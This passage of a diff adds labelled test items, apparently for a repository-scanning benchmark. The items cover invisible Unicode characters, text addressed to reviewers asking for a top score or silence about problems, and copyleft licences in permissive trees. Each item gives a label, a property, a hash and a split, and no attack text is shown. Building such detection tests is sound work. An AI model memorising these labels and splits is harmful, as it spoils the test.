+   "id": "hidden-characters-pos17",
+   "label": "positive",
+   "property": "The file docs/api.md contains the invisible character U+202C inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "4bf10d709d84c31cfe20c8f2f3370029e01d0cf818b467ba2ab5ea785e4b816d",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos18",
+   "label": "positive",
+   "property": "The file src/Main.java contains the invisible character U+2067 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "d3b6820d393aa49d0d230a712b09c536f07a4facb62f9b33520c181fc3c52f5f",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos19",
+   "label": "positive",
+   "property": "The file docs/guide.rst contains the invisible character U+200B inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "8d911eff3ff386dd6b5da303e8f6e3c89f95ac956e9d4ca5e1faf74cf3b5afad",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-pos20",
+   "label": "positive",
+   "property": "The file web/page.html contains the invisible character U+2061 inside ordinary text outside any test, example or docs-sample location.",
+   "sha256": "36b3063e1fdb46d35f30096e9b3ea4c9f3847e80d723e51b94bd88047dda8dbb",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg01",
+   "label": "negative",
+   "property": "A Persian README uses zero-width non-joiners (U+200C) inside words.",
+   "sha256": "2da8196500269458640eda8e24d9aa547d4dbe9f901d34db3a526d0db94d1882",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg02",
+   "label": "negative",
+   "property": "A Markdown file holds an emoji sequence joined by zero-width joiners (U+200D).",
+   "sha256": "bad290b31fe260ae9347d91f542ef02dad3ff630959f94acb8a69c605e9dd1d5",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg03",
+   "label": "negative",
+   "property": "An Arabic string contains right-to-left marks (U+200F).",
+   "sha256": "c631e875d00bffa90330800797a78cf5adaed08db27cff587d1fd88712908a92",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg04",
+   "label": "negative",
+   "property": "An English string contains a left-to-right mark (U+200E) after a Hebrew word.",
+   "sha256": "5ca59431b1851129dd42077230429b835cd5d56cfcc0d8fe754fe0daed59c639",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg05",
+   "label": "negative",
+   "property": "A file starts with a byte-order mark and holds no other special character.",
+   "sha256": "15af213bdefe3369df25d85cdfb94b2fa8df766ee6b7940b1bd54816d5d4f566",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg06",
+   "label": "negative",
+   "property": "A string holds a soft hyphen (U+00AD).",
+   "sha256": "1fb13e079ab02dcf335da4bbda0cbdef2b0d000f5c01b44bf174cd03e8229402",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg07",
+   "label": "negative",
+   "property": "A string holds a no-break space (U+00A0).",
+   "sha256": "a36ebb45fca9167583510f55c428010c4cd6151125d4748711a61fec511cf306",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg08",
+   "label": "negative",
+   "property": "A string holds a thin space (U+2009).",
+   "sha256": "8eb1298bd35aab942a21f283e1333126bc6e46fae7adafef3cfcb8904bd6931d",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg09",
+   "label": "negative",
+   "property": "A string holds a narrow no-break space (U+202F).",
+   "sha256": "0aba23dfbbb3f1d8a7686cfef392e90a239d86dd7148e8ac35c77a11a42338bd",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg10",
+   "label": "negative",
+   "property": "An emoji is followed by a variation selector (U+FE0F).",
+   "sha256": "73fe5b4aead5e487cdf0ccbace05fd30e6d69790bcb5d5d58961104d0a4a3fa1",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg11",
+   "label": "negative",
+   "property": "The source writes the zero-width space as an escape sequence, a visible backslash and digits.",
+   "sha256": "df063f7d55d0257a56b210069a09782d0e214b79c5fa2cecd38fc70ef3839329",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg12",
+   "label": "negative",
+   "property": "The documentation names U+200B in plain digits and letters; the character itself is absent.",
+   "sha256": "b5e2eb2a3e7ae639afabc6fd5e9089252b6ffc157a4c019fe4b0d3820faa92dc",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg13",
+   "label": "negative",
+   "property": "A sanitiser strips zero-width characters and writes them only as escapes.",
+   "sha256": "7e11d0e4b1635a196229f8e7357d659861b36c2c4ae19c07078d7aa92eceb86f",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg14",
+   "label": "negative",
+   "property": "A Hindi document uses a zero-width joiner (U+200D) in a conjunct.",
+   "sha256": "f293406c3df62e7df4bd29dd410661c81c4e47fac96838e07a25d7bbde45fd68",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg15",
+   "label": "negative",
+   "property": "A Persian string with a zero-width non-joiner sits in a Python docstring.",
+   "sha256": "fe9f6048ce552993e9a1714b32ecc05456ee39d696b1816d07e912878fc3a9c5",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg16",
+   "label": "negative",
+   "property": "The file holds a plain em space (U+2003) and an ordinary hyphen only.",
+   "sha256": "d7412e3b2828a957a42e8951d481f4d31f458e8385ffdc681cbf9d8147e53548",
+   "split": "dev"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg17",
+   "label": "negative",
+   "property": "A line holds a figure space (U+2007) between digits.",
+   "sha256": "3bc0ffcf578ac62de9041dcfdeab36fe046bcb83d9686a63696791942fec2fd4",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg18",
+   "label": "negative",
+   "property": "A TypeScript file is encoded with a byte-order mark and holds ordinary ASCII code.",
+   "sha256": "a9b8034bc8f3c54da5f8a3ddfc40f4b444568c604f7454fcd07be89d3f2af6b3",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg19",
+   "label": "negative",
+   "property": "Japanese text with full-width punctuation and an ideographic space (U+3000).",
+   "sha256": "f7a3068c714a179c26232a45fa74d6388dcfc21940e83113a4a794481d54604c",
+   "split": "test"
+  },
+  {
+   "check": "hidden-characters",
+   "id": "hidden-characters-neg20",
+   "label": "negative",
+   "property": "A Greek text with a middle dot and a combining accent only.",
+   "sha256": "94ec40a429e943c8eb26e4cbd2470bc82fc801769a34b2ed050088cd4b5d6135",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos01",
+   "label": "positive",
+   "property": "The file README.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "2d0af14e9874c5a39d13ebdbef11dd9c3cdee7a6d05692ededdf0d875c11f941",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos02",
+   "label": "positive",
+   "property": "The file skills/export/SKILL.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "7db7039620e47853a9d3667b62a592681c46e1ec056908e8f3fac4b368e09bdd",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos03",
+   "label": "positive",
+   "property": "The file agents/reviewer.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "d8bf5a1306d119fe8be60f557a917f904722ac6e7e8968793589fb906672e99a",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos04",
+   "label": "positive",
+   "property": "The file CONTRIBUTING.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "32f1cd0a026cb26be5c0028abc5f11da948e085017c9369a31360e3792e1cfd3",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos05",
+   "label": "positive",
+   "property": "The file src/main.py holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "2f1cdc95c7c327a475a6da6ada74dbf7c53e5aa68891b2eece3257f27a24ed3a",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos06",
+   "label": "positive",
+   "property": "The file docs/NOTES.txt holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "c050d6b41de9d84833dfdee89c7c0f62b91d30d1b8b2df0c8cd1caf2d163ccc1",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos07",
+   "label": "positive",
+   "property": "The file src/app.js holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "09fe10ee9a0ff3c057d8bbe404955f7e36b585deb5c0757254a05a7304d47ff9",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos08",
+   "label": "positive",
+   "property": "The file README.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "9d68c02ef420757ae94b1e3f40faceb2f0660bb3cd176e5eac7dccc52ba5105b",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos09",
+   "label": "positive",
+   "property": "The file docs/about.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "8128817ec7203b105b4de6bf4e63a32767af6d60d1c33ac0b26b3ab93eb85815",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos10",
+   "label": "positive",
+   "property": "The file src/lib.py holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "d151f6aea2c89ee5badb804cab4b86bf0a8ccdbec9adfd04f09bf1a7607a28ef",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos11",
+   "label": "positive",
+   "property": "The file config/meta.yml holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "13b281a39e7b44cec8db5f057f4ff2eb8bc3289bd662f58cfac3863b99759374",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos12",
+   "label": "positive",
+   "property": "The file README.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "f7d243a2ef0f1ee6dccdb73d732135abba4bdcb0a6e0d511e43a7570f84b8e33",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos13",
+   "label": "positive",
+   "property": "The file skills/plan/SKILL.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "9400b5480e648337178239f405d812151dd77a468584400ec918b55b5cc6e82f",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos14",
+   "label": "positive",
+   "property": "The file docs/FAQ.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "a71f5c17d15732b2fe4ae40066c7c62f6e07feec8ae71b64755a108a833634fc",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos15",
+   "label": "positive",
+   "property": "The file src/server.go holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "c398662e139d2386de222e5e3416befac84e93fcc1e4d0fae7a8a4d1bf45b83a",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos16",
+   "label": "positive",
+   "property": "The file docs/SUBMISSION.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "275f4525c141bfed522ad2c72d19867fddb429a5873319a10606f40aa89eaae9",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos17",
+   "label": "positive",
+   "property": "The file README.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "e2a9db5cf77a962a9ed04c7d881ca8a8ffc52df2c9dab4066fc38ef65b813a70",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos18",
+   "label": "positive",
+   "property": "The file agents/helper.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "2a00eebdf9b557f2626cecfccaa9e947a57fd08cb3cf5a3de32dc1351f0d07ac",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos19",
+   "label": "positive",
+   "property": "The file docs/LICENSE-NOTES.md holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "b0c70c33da586d0ea2faf1162d7bc93dfe562107de64a25886f5f9034ecb388f",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-pos20",
+   "label": "positive",
+   "property": "The file scripts/run.sh holds a sentence addressed to whoever reviews or scores the repository, asking for a top score, a pass, or silence about problems.",
+   "sha256": "bdbb19c9b47d1c137a0d97afab1939493f5fbf7b80a391eefa7bf6dd8ebd6704",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg01",
+   "label": "negative",
+   "property": "A security guide quotes an attack under the label 'Example attack' and tells reviewers to refuse it.",
+   "sha256": "72670f35b0dfc9daf82f39ecefb0764e4f84a546d2b6030b619ff67c2807f28d",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg02",
+   "label": "negative",
+   "property": "A source file lists attack phrases in a denylist, in a function that blocks them.",
+   "sha256": "11ac348edccbb006e01281c9c1576d55444fd7f8b08777bd2ea0e51e40135a6b",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg03",
+   "label": "negative",
+   "property": "A rubric describes how human judges give scores from 1 to 10 on four criteria.",
+   "sha256": "db3da5a302551d7d09f765e6c0374c29710ef715d71c92ce514fd81897ecebc9",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg04",
+   "label": "negative",
+   "property": "The store page asks app users to rate the app ten stars.",
+   "sha256": "35d707e1ce3a6286ef94059e15998a1ad731f43d1134e1375b25a300dffc941a",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg05",
+   "label": "negative",
+   "property": "A changelog says the project is verified on a Python release.",
+   "sha256": "cf6e55740b3acc1ba0039c91aaa6a29e2aa39c0efb4c0f3f1f9f0e347922b94b",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg06",
+   "label": "negative",
+   "property": "A migration note for version 3 tells readers that the older setup steps no longer apply to version 2.",
+   "sha256": "fcd241d076bec34c171a415b0fa67a5d2ee5f477471fdb3fc32d086d5b44980f",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg07",
+   "label": "negative",
+   "property": "A lint note says to disregard previous warnings after the upgrade.",
+   "sha256": "bd2d5e9183b3fc22484a9bfd54973f4a3407ffd12cb073394c791569796f6a83",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg08",
+   "label": "negative",
+   "property": "The project's own grading feature has a prompt file that tells its model to score student answers.",
+   "sha256": "f5dc128404b05d01de8b48563224af69352bef2d291896d14d5edb88fc2ed272",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg09",
+   "label": "negative",
+   "property": "A security policy tells reporters not to report the issue in public.",
+   "sha256": "3db80065cec5e4748f2835444e48fb1d82c12dab191f5ebbff1999ae9d132ada",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg10",
+   "label": "negative",
+   "property": "A README describes how the scoring feature of the app works, with no instruction to a reader.",
+   "sha256": "1b1893bca8609470fcfbdb4ed50e5169f6897d52a0beec00fdd2e1510ea6f078",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg11",
+   "label": "negative",
+   "property": "A plain installation guide.",
+   "sha256": "79acd784fe54007702c471cb2b6896e57eecb525ec71a1f1653dd3a583a890ce",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg12",
+   "label": "negative",
+   "property": "An API reference page.",
+   "sha256": "622e1e18af1ac66013117a09bfde85fc345d2e8d24f61495cceb0a5be30d8bd7",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg13",
+   "label": "negative",
+   "property": "A prompt-injection research note quotes the attack in a section about detection.",
+   "sha256": "f577b2fba7beac4bd6737b9fbdc223e1e19853e81fb4c3d3f4e76168866b4d85",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg14",
+   "label": "negative",
+   "property": "A test-planning note says reviewers should check the build themselves.",
+   "sha256": "2937dae672951906b866e2ca673f32101c1c4831b74587ae92a8347cb981968c",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg15",
+   "label": "negative",
+   "property": "A game README says players rate the game after play.",
+   "sha256": "365ad7698ff320c4aa9fed4aac6c67d083810e5fb268c2492e090b153ed50c08",
+   "split": "dev"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg16",
+   "label": "negative",
+   "property": "A governance file says maintainers approve pull requests after two reviews.",
+   "sha256": "bf3c9ae9cd7105410b028c6f19efff8decace45b23da6cc333248d23df82b115",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg17",
+   "label": "negative",
+   "property": "A source comment explains that a function awards points in the game.",
+   "sha256": "285d4e137e9af4baa2d4e1bccac2152b6f7a2c5a5fc2f05dc4ca0b1bfee1e962",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg18",
+   "label": "negative",
+   "property": "A code of conduct asks contributors not to flag other people in comments.",
+   "sha256": "922ee1ce3a73bb823b77a1006d9b5a0e622aaee9ed4ecd69494f8ff12bbd70db",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg19",
+   "label": "negative",
+   "property": "A benchmark note reports average scores of the project's own model on a public task.",
+   "sha256": "cf6f58ede4886146c594e7b736770fd1bbd96d9d9e8024d5c8f48b49f3ceff30",
+   "split": "test"
+  },
+  {
+   "check": "evaluator-directed-text",
+   "id": "evaluator-directed-text-neg20",
+   "label": "negative",
+   "property": "A contributor guide says the CI must be green before a merge.",
+   "sha256": "9a7a8c09ee8b4f7ad067495a0be356cb78d42e8eb2e1107afe2047217d7fd717",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos01",
+   "label": "positive",
+   "property": "vendor/fastclip/LICENSE holds a GNU general public licence text and the root LICENSE is MIT.",
+   "sha256": "96a15cecd4a4f011061bcbe6b5333b6e3829198c9658dc54b2af2f19e14590c0",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos02",
+   "label": "positive",
+   "property": "third_party/net/COPYING holds a GNU general public licence version 2 text and the root LICENSE is Apache.",
+   "sha256": "3651b6edc43923e709ae93b866d4b91b5d53f35d239d0020ced861fd1e941890",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos03",
+   "label": "positive",
+   "property": "src/engine.py carries an SPDX header naming a GPL identifier and the root LICENSE is BSD.",
+   "sha256": "ac7bd4ddc773764a0044e819d5795d57b4c3d058f8276619e9723de33a8f3cd2",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos04",
+   "label": "positive",
+   "property": "lib/store.js carries an SPDX header naming an AGPL identifier and the root LICENSE is ISC.",
+   "sha256": "4e0e823cea549bd85a1204c575049bf9cddcd4e3e5fa0323dbfeb93fa2cbe1d9",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos05",
+   "label": "positive",
+   "property": "vendor/dbkit/LICENSE holds a GNU Affero licence text and the root LICENSE is MIT.",
+   "sha256": "d1f1fbe8b4197f588b66c4794a81893e36a648aed8779bb0d7d6d95282789066",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos06",
+   "label": "positive",
+   "property": "pkg/codec/codec.go carries an SPDX header naming an LGPL identifier and the root LICENSE is Apache.",
+   "sha256": "fc274b1172883f18c42dc0ed117e406bd54e0fef9656a629cd8fdfd51683cf52",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos07",
+   "label": "positive",
+   "property": "NOTICE holds a GNU general public licence text and the root LICENSE is BSD.",
+   "sha256": "1188af270f4065c88eb3fe18d6e5c82b2a8fda201fd9ce64c04596db7adc09ad",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos08",
+   "label": "positive",
+   "property": "vendor/imgtool/LICENSE.txt holds a GNU lesser general public licence text and the root LICENSE is ISC.",
+   "sha256": "f141b88bbfef4ac983e9f52c68111a1d1d3bcd9778b9df9fa9ab18307ca24e2b",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos09",
+   "label": "positive",
+   "property": "src/a.rs carries an SPDX header naming a GPL identifier and src/b.rs a permissive one; the root LICENSE is MIT.",
+   "sha256": "76e483d509094f724b6257efeb541830780734f3c16c1d7fa6a7cc22448acb30",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos10",
+   "label": "positive",
+   "property": "extern/parser/COPYING holds a GNU general public licence text and the root LICENSE is Apache.",
+   "sha256": "a3813eeb1e91d61489fa3ae4dc75ae81d7b311bdf1f036b29d07bd2ffb416dc9",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos11",
+   "label": "positive",
+   "property": "vendor/fastclip/LICENSE holds a GNU general public licence text and the root LICENSE is BSD.",
+   "sha256": "5687ba2ae97a4510a45d704c30a9a6ee634b1df3764cc1bffd0064501497408f",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos12",
+   "label": "positive",
+   "property": "third_party/net/COPYING holds a GNU general public licence version 2 text and the root LICENSE is ISC.",
+   "sha256": "e1a2414237fc91f1e3356d1deb8c54a4d5c4ecad71876cc1e168bda710ffe885",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos13",
+   "label": "positive",
+   "property": "src/engine.py carries an SPDX header naming a GPL identifier and the root LICENSE is MIT.",
+   "sha256": "f451ab8c4d0f38f2a0f48eaa4fc3c29998c91f91dc262a74ae70d1d2f797c28b",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos14",
+   "label": "positive",
+   "property": "lib/store.js carries an SPDX header naming an AGPL identifier and the root LICENSE is Apache.",
+   "sha256": "b2dea300afbe66291fe990fa4298db23e33458f8b141b412367b7d6f7bbde133",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos15",
+   "label": "positive",
+   "property": "vendor/dbkit/LICENSE holds a GNU Affero licence text and the root LICENSE is BSD.",
+   "sha256": "4153603acd2c753286b91956ac9d7c3699ff5a592673b46113df76e0c3c905d0",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos16",
+   "label": "positive",
+   "property": "pkg/codec/codec.go carries an SPDX header naming an LGPL identifier and the root LICENSE is ISC.",
+   "sha256": "07cc38a2bc9436f748f93237e4d2f9d1ba14debc0e3c508e7c7822ac77a6c88d",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos17",
+   "label": "positive",
+   "property": "NOTICE holds a GNU general public licence text and the root LICENSE is MIT.",
+   "sha256": "97206c510b0628319e6cf4df10ad55422704ac3c7dd9c351a6b29d0a7a0406ff",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos18",
+   "label": "positive",
+   "property": "vendor/imgtool/LICENSE.txt holds a GNU lesser general public licence text and the root LICENSE is Apache.",
+   "sha256": "13c97c7b8c18c50a26b767b7e1409f6f1cfef8771cb742e5f3ddbfb81b3f4ea1",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos19",
+   "label": "positive",
+   "property": "src/a.rs carries an SPDX header naming a GPL identifier and src/b.rs a permissive one; the root LICENSE is BSD.",
+   "sha256": "be24099d339132907f1d7ccfb7c21f0b471fa885ee6bac7de8aa1571d9210b69",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-pos20",
+   "label": "positive",
+   "property": "extern/parser/COPYING holds a GNU general public licence text and the root LICENSE is ISC.",
+   "sha256": "9b58e0a6364d42ee9d3e645d392664de4551cf8ab27efdce99851167174cc653",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg01",
+   "label": "negative",
+   "property": "The root LICENSE is a GNU general public licence text and a vendored copy holds the same licence.",
+   "sha256": "178eccaa1aac389fb40377a373528980f08e5139dc11623c4c9fd41a870d8fb9",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg02",
+   "label": "negative",
+   "property": "Only the README mentions the GNU general public licence, in prose; no licence file or SPDX header names it.",
+   "sha256": "70cd3004a6b9fff9843060cfe20c8182bf89965f12fa09c304b55551f08cb406",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg03",
+   "label": "negative",
+   "property": "A documentation table lists licence names including GPL-3.0; no licence file or SPDX header names it.",
+   "sha256": "692d1b57aab5c73d2e7384edfe6911ef06d85afa8711ae23b3f60aeabddf5570",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg04",
+   "label": "negative",
+   "property": "A vendored directory holds an Apache licence text; no copyleft text exists.",
+   "sha256": "87022287b5b44b4cfdf45dfb3c75852c83b283d2edec63047c37d024c44a150e",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg05",
+   "label": "negative",
+   "property": "Two vendored directories hold a BSD and an ISC licence text; no copyleft text exists.",
+   "sha256": "65b7abfe25ba65d097168bc91aa6a26ec2015eb33c4ee3e4cd5a102ad4a659b2",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg06",
+   "label": "negative",
+   "property": "The root has no licence file and a vendored directory holds a GNU general public licence text.",
+   "sha256": "da6cd658eef5064bb2bb5db10cd02174f1cba21015c72d73cfa16d39c6c8b5f3",
+   "split": "dev"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg07",
+   "label": "negative",
+   "property": "A source file carries an SPDX header naming MIT only.",
+   "sha256": "e755d37cf8ea5dbb3052e313d9d559284ad2c5561cee9ce22da70baf029d1f0a",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg08",
+   "label": "negative",
+   "property": "A source comment says the code is not derived from GPL code; it is prose, not a licence file or SPDX header.",
+   "sha256": "17a4663ffe5a67de8e1d257e8e5bc6c667cf75d4ac20962443e64a09a2bc400c",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg09",
+   "label": "negative",
+   "property": "The root LICENSE is Apache and a vendored directory holds an MIT licence.",
+   "sha256": "47d0241de4de87b4c9dc2ae59399b263a5c42b5f6a9bf28faf332cdc86588845",
+   "split": "test"
+  },
+  {
+   "check": "copyleft-in-permissive-tree",
+   "id": "copyleft-in-permissive-tree-neg10",
+   "label": "negative",
+   "property": "The changelog mentions a former GPL licence in prose; no licence file or SPDX header names it.",
